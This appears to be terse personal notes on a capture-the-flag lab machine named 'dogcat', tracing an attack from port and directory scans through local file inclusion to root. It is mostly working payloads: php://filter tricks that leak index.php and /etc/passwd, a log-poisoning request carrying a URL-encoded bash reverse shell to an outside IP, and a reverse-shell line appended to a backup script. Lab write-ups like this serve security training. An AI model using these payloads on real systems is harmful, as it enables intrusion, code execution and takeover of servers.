start with nmap

http 80 
ssh 22

ffuf

/index.php
/cats
/dogs


http://10.10.222.120/?view=dogs/2.jpg

?view append php after file and try to fetch it.

throw different errors

```
http://10.10.222.120/?view=dogs/../index

Fatal error: Cannot redeclare containsStr() (previously declared in /var/www/html/index.php:17) in /var/www/html/index.php on line 17

```

```
http://10.10.222.120/?view=dogs/../index.php

Warning: include(dogs/../index.php.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dogs/../index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24

```

http://10.10.222.120/?view=pHp://FilTer/convert.base64-encode/resource=dogs/../index

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>


```

got lfi using

```
http://10.10.59.185/?view=php://filter/convert.iconv.utf-8.utf-16/resource=dogs/../../../../../../../../etc/passwd&ext
```

get shell :

```
http://10.10.37.116/?view=dog../../../../..//var/log/apache2/access.log&ext&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.133.3%2F1234%200%3E%261%27

```


***

env_reset, mail_badpass,

/opt/backup/

echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.133.3/1337 0>&1'" >> backup.sh